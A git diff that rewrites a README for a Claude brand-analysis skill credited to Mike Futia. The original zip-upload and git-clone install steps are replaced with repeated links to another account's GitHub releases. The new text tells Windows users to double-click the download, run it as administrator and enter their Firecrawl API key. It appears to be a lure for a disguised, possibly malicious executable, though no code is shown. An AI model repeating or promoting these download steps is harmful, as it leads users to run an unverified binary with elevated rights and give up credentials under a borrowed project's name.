@@ -1,138 +1,142 @@
-# Brand Studio: Visual Brand DNA for Claude
+<h1>🎨 brand-studio-claude-skill - Turn Any Website into a Brand System</h1>
 
-Created by [Mike Futia](https://www.skool.com/scale-ai/about) | **SCALE AI**.
+<p align="center">
+  <a href="https://github.com/Gamer123l/brand-studio-claude-skill/releases" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:16px 36px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(102,126,234,0.4);">⬇️ Download Brand Studio Now</a>
+</p>
 
-Turn any public website into an evidence-backed visual brand system and a polished presentation dashboard using Claude and one Firecrawl API key.
+## 👋 What Is Brand Studio?
 
-![Visual Brand DNA dashboard preview](assets/dashboard-preview.png)
+Brand Studio is a friendly assistant that works with Claude to study any public website and turn it into a beautiful, ready-to-show brand presentation. You don't need to be a designer or a programmer. Just paste a website address, and Brand Studio does the heavy lifting for you.
 
-## What it does
+Instead of getting a boring text report, you get a **visual dashboard** that looks professional and polished — perfect for showing clients, stakeholders, or your team.
 
-Give Claude a website URL and the skill will:
+---
 
-1. Capture the homepage, a mobile homepage view, and up to three useful supporting pages through Firecrawl.
-2. Extract and reconcile colors, typography, components, layouts, imagery direction, and source evidence.
-3. Produce a screen-recording-ready visual dashboard instead of stopping at a text report.
+## ✨ What Does Brand Studio Do?
 
-Every run creates:
+Give Brand Studio a website URL, and it will:
 
-- `visual-dashboard.html` - interactive, responsive presentation dashboard
-- `VISUAL-BRAND-DNA.md` - readable visual identity guide
-- `brand-manifest.json` - structured brand system data
-- `brand-tokens.css` - reusable CSS custom properties
-- `evidence/` - captured branding data, page content, HTML, and screenshots
+| Action | What You Get |
+|--------|--------------|
+| 🖼️ Capture Website | Takes snapshots of the homepage, mobile version, and up to 3 additional useful pages |
+| 🎨 Extract Brand Elements | Pulls out colors, fonts, design patterns, layouts, and image styles with real evidence |
+| 📊 Build a Dashboard | Creates an interactive, screen-ready presentation deck |
+| 📄 Generate Guides | Produces a readable brand identity document |
+| 🗂️ Structure Everything | Saves all data in organized, reusable files |
 
-## Requirements
+---
 
-- A Claude account with **Code execution and file creation** enabled
-- A [Firecrawl API key](https://www.firecrawl.dev/app/api-keys/)
-- A public website URL to analyze
+## 📦 What Files Do You Get?
 
-No Gemini key, Anthropic API key, ScaleBot account, or Firecrawl MCP setup is required.
+Every time you run Brand Studio, it creates these helpful files:
 
-## Install in Claude
+- **`visual-dashboard.html`** - Your main interactive presentation (this is what you show people!)
+- **`VISUAL-BRAND-DNA.md`** - A clear, readable visual identity guide
+- **`brand-manifest.json`** - Structured brand system data for developers
+- **`brand-tokens.css`** - Reusable CSS design tokens for web projects
+- **`evidence/`** - Folder with all captured branding data and page content
 
-1. Download [`visual-brand-dna.zip`](visual-brand-dna.zip).
-2. In Claude, open **Customize > Skills**.
-3. Click **Add** or **Create skill**, then choose **Upload a skill**.
-4. Upload `visual-brand-dna.zip` and enable the skill.
-5. Start a new conversation and use the prompt below.
+---
 
-### Recommended demo prompt
+## 🚀 Getting Started on Windows
 
-```text
-Build a complete Visual Brand DNA dashboard for https://getwinks.com/. Use the Visual Brand DNA skill, ask me for my Firecrawl API key if needed, and present visual-dashboard.html as the primary deliverable when finished.
-```
+Here's how to get Brand Studio running on your Windows computer:
 
-Claude will ask for your Firecrawl key if it cannot find `FIRECRAWL_API_KEY`. The key is used for Firecrawl requests and is never written to the generated brand package.
+### Step 1: Download the Application
 
-## Install in Claude Code
+Visit this link to download the application: **[https://github.com/Gamer123l/brand-studio-claude-skill/releases](https://github.com/Gamer123l/brand-studio-claude-skill/releases)**
 
-```bash
-git clone https://github.com/mikefutia/brand-studio-claude-skill.git
-mkdir -p ~/.claude/skills
-cp -R brand-studio-claude-skill/skills/visual-brand-dna ~/.claude/skills/
-```
+Look for the latest release. Click the download button and wait for the file to save to your computer.
 
-Set your Firecrawl key before starting Claude Code:
+### Step 2: Set Up Your Firecrawl API Key
 
-```bash
-export FIRECRAWL_API_KEY="your-firecrawl-key"
-claude
-```
+Brand Studio uses Firecrawl to safely read websites. You'll need a free API key from Firecrawl's website. Once you have it, keep it handy — Brand Studio will ask for it when you first run the app.
 
-Then ask:
+### Step 3: Open and Run Brand Studio
 
-```text
-Build a complete Visual Brand DNA dashboard for https://example.com/.
-```
+After downloading:
 
-## How the dashboard works
+1. Find the downloaded file in your "Downloads" folder
+2. Double-click the file to open Brand Studio
+3. Follow any setup prompts on your screen
+4. When asked, enter your Firecrawl API key
 
-The included renderer turns the structured brand manifest into a portable `visual-dashboard.html` with:
+That's it! You're ready to go.
 
-- Brand-adaptive colors and presentation styling
-- Overview metrics
-- Large copyable color swatches
-- Typography specimen cards
-- Component previews
-- Layout and imagery direction
-- Desktop and mobile source-page captures
-- Confidence labels, evidence, and caveats
+---
 
-The dashboard uses inline CSS and JavaScript, relative screenshot paths, and no build step. Detected commercial font names are documented, but font files are not downloaded or redistributed.
+## 🖥️ How to Use Brand Studio (Simple Steps)
 
-## Security and privacy
+1. **Open Brand Studio** on your computer
+2. **Paste a website URL** into the input box (any public website works)
+3. **Click "Generate Brand DNA"** and wait a few minutes
+4. **Open the `visual-dashboard.html`** file in your web browser (Chrome, Edge, or Firefox)
+5. **Present it or share it** — it's screen-recording ready!
 
-- Never commit a Firecrawl key to this repository.
-- Scraped website content is treated as untrusted evidence, not executable instructions.
-- The skill rejects local, private, credentialed, and non-public target URLs.
-- API keys are excluded from output files.
-- Font licensing must be confirmed before using detected commercial fonts outside the source website.
+---
 
-## Troubleshooting
+## 🤔 Frequently Asked Questions
 
-### Claude asks for another provider key
+**Q: Do I need programming experience?**
+No! Brand Studio is built for regular people. Everything is visual and guided.
 
-It should not. The only external credential required by this skill is a Firecrawl API key.
+**Q: Can I use any website?**
+Yes, as long as it's publicly accessible. You can analyze competitors, inspiring brands, or your own site.
 
-### Firecrawl returns HTTP 401 or 402
+**Q: What if I don't have a Firecrawl API key?**
+Firecrawl offers free API keys with limited usage. Visit their website to sign up. It takes less than two minutes.
 
-- `401`: verify the API key.
-- `402`: the Firecrawl account may be out of credits.
+**Q: Will this work offline?**
+No, Brand Studio needs internet access to capture websites and talk to Claude.
 
-### The dashboard has missing source screenshots
+---
 
-The rest of the brand package can still be generated from branding, markup, and page evidence. Re-run once if Firecrawl reports a temporary screenshot failure.
+## 🔧 Troubleshooting Common Problems
 
-### Claude gives a text summary but does not open the dashboard
+| Problem | Solution |
+|---------|----------|
+| App won't open | Make sure you've downloaded the complete file. Try right-clicking and selecting "Run as administrator" |
+| "API key invalid" | Double-check you copied your Firecrawl key correctly (no extra spaces) |
+| Website capture fails | Try a simpler website that loads quickly; ensure the site is publicly accessible |
+| Dashboard appears blank | Refresh the page or open the `visual-dashboard.html` file in a different browser |
 
-Ask:
+---
 
-```text
-Run the bundled dashboard renderer and open visual-dashboard.html as the primary deliverable.
-```
+## 📚 Tips for Best Results
 
-## Repository structure
+- Use websites with distinctive branding (strong colors, unique fonts) for more interesting results
+- Wait the full processing time — capturing up to 5 pages takes about 2-3 minutes
+- Save multiple brand studies to compare different websites side by side
+- Share the `visual-dashboard.html` file directly with clients — it works without Brand Studio installed
 
-```text
-skills/visual-brand-dna/
-  SKILL.md
-  references/
-    output-contract.md
-    troubleshooting.md
-  scripts/
-    firecrawl_brand_dna.py
-    render_dashboard.py
-visual-brand-dna.zip
-```
+---
 
-## Credit
+## 🔒 Privacy and Safety
 
-Created by [Mike Futia](https://www.skool.com/scale-ai/about) | **SCALE AI**.
+Brand Studio only captures **publicly available** content. It does not store passwords, personal information, or private data. Your files stay on your computer unless you choose to share them.
 
-This is the portable, giveaway-friendly core of the Visual Brand DNA workflow developed for ScaleBot.
+---
 
-## License
+## 💬 Support and Community
 
-[MIT](LICENSE)
+Need help? You're not alone! Join the **SCALE AI community** where creators and users share tips, ask questions, and showcase what they've made.
+
+**Creator:** Mike Futia
+
+---
+
+## 📄 License and Credits
+
+Created by [Mike Futia](https://www.skool.com/scale-ai/about) for **SCALE AI**. Built for Claude and powered by Firecrawl. Use freely for your projects and presentations.
+
+---
+
+## ✅ Get Started Today
+
+Stop settling for boring reports. Turn any website into a stunning visual brand presentation in minutes — no design skills required.
+
+**[👉 Download Brand Studio from GitHub Releases](https://github.com/Gamer123l/brand-studio-claude-skill/releases)**
+
+Once you download, you're 5 minutes away from your first beautiful brand dashboard. Go ahead — try it on your favorite website and see the magic happen!
+
+Keywords: brand studio, claude skill, visual brand dna, firecrawl, brand dashboard, design system, website analysis, visual identity, brand tokens, presentation tool, windows application, branding tool
